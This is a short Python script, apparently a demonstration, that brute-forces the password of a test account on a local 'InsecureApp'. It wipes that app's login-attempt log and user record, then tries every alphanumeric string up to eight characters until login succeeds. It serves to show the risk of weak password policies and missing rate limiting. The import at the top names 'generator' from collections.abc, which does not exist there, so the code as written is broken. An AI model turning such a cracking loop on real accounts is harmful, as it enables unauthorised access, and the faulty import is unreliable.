import itertools
import string
from collections.abc import generator

from insecure_api import InsecureApp


def generate_strings() -> generator:
    """
    This generator generates weak passwords consisting of ASCII letters and
    digits up to 8 characters long.
    Source: Chat GPT.
    """
    for length in range(9):
        for comb in itertools.product(
            string.ascii_letters + string.digits,
            repeat=length
        ):
            yield "".join(comb)


def brute_force() -> None:
    app = InsecureApp()

    # Delete failed login attempts
    app.cur.execute(
        """
        DELETE FROM log_in_attempts;
        """
    )

    # Delete user
    app.cur.execute(
        """
        DELETE FROM users WHERE email = 'victim@example.com';
        """
    )

    # Create the victim's user account
    app.create_user(email="victim@example.com", password="b")

    app.db_conn.commit()

    # Let's say the attacker knows the target's email address, but not the
    # password. Due to the weak password policy and no API rate limiting, the
    # hacker can crack the password using a brute force attack.

    for password in generate_strings():
        print(f"Trying password: {password}")
        user = app.authenticate(email="victim@example.com", password=password)
        if user is not None:
            print(f"Password cracked. Password is: {password}")
            break


brute_force()
